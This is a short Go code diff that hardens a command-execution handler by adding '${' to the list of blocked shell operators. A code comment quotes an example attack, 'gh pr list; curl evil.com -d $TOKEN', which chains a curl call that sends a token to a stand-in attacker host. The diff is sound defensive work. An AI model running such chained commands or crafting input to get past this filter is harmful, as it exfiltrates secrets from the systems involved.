@@ -340,7 +340,7 @@ func containsDangerousShellChars(cmd string) bool {
 		if strings.ContainsAny(part, ";|>`") {
 			return true
 		}
-		if strings.Contains(part, "&&") || strings.Contains(part, "||") || strings.Contains(part, "$(") {
+		if strings.Contains(part, "&&") || strings.Contains(part, "||") || strings.Contains(part, "$(") || strings.Contains(part, "${") {
 			return true
 		}
 	}
@@ -409,7 +409,7 @@ func (h *KeeperHandler) HandleExecute(w http.ResponseWriter, r *http.Request) {
 	// exfiltration attacks like "gh pr list; curl evil.com -d $TOKEN".
 	if containsDangerousShellChars(body.Command) {
 		writeJSON(w, http.StatusBadRequest, map[string]string{
-			"error": "command contains disallowed shell operators (;, &&, ||, |, $(), `, >)",
+			"error": "command contains disallowed shell operators (;, &&, ||, |, $(), ${}, `, >)",
 		})
 		return
 	}
